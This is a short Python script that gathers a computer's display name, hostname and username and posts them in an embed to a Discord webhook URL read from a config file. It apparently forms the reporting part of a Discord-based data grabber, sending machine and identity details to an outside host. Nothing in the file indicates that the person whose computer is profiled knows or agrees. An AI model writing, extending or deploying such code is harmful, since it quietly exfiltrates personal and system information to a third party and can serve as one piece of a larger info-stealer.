from discord_webhook import *
import user_info
from config import DEFAULT_COLOR, DEFAULT_WEBHOOK, USER_INFO_TITLE, USER_INFO_DESCRIPTION

webhook_url = DEFAULT_WEBHOOK

color = DEFAULT_COLOR
title = USER_INFO_TITLE
description = USER_INFO_DESCRIPTION



webhook = DiscordWebhook(url=webhook_url, content="", rate_limit_retry=True)

embed = DiscordEmbed(title=title, description=description, color=color)
embed.add_embed_field(name="", value=f"```Display Name: {user_info.get_display_name()} \nHostname: {user_info.get_hostname()} \nUsername: {user_info.get_username()}```", inline=False)

webhook.add_embed(embed)

def send_user_info():
    response = webhook.execute()